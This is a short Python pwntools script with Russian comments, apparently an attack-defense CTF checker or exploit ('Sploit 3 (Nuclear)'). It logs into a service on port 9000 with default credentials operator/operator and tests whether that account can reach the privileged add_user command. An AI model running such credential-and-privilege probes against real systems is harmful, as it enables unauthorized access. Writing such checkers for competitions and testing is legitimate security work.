import asyncio
from pwn import *
from colorama import Fore, Style


async def check_operator_add_user(ip, port):
    try:
        # Устанавливаем соединение
        connection = remote(ip, port, timeout=10)

        # Вход под учетной записью operator
        connection.recvuntil("Введите имя пользователя: ")
        connection.sendline("operator")
        connection.recvuntil("Введите пароль: ")
        connection.sendline("operator")
        
        connection.recvuntil("> ")
        
        # Попытка выполнить add_user
        connection.sendline("add_user")
        
        # Читаем ответ сервера
        response = connection.recvall(timeout=10).decode('utf-8')

        # Проверяем, запрашивается ли имя пользователя
        if "Введите имя пользователя" in response:
            connection.close()
            print(Fore.GREEN + f"[+] Sploit 3 (Nuclear): {ip}:{port} - user add sploit response successfull" + Style.RESET_ALL)
            return 101, None  # Уязвимость существует

        connection.close()
        print(Fore.RED + f"[-] Sploit 3 (Nuclear): {ip}:{port} - user add sploit response failed" + Style.RESET_ALL)
        return 102, None  # Уязвимости нет
    except:
        return 110, None  # Ошибка скрипта


async def pwn(HOST):
    VERDICT = await check_operator_add_user(HOST, 9000)
    print(VERDICT)
    return VERDICT
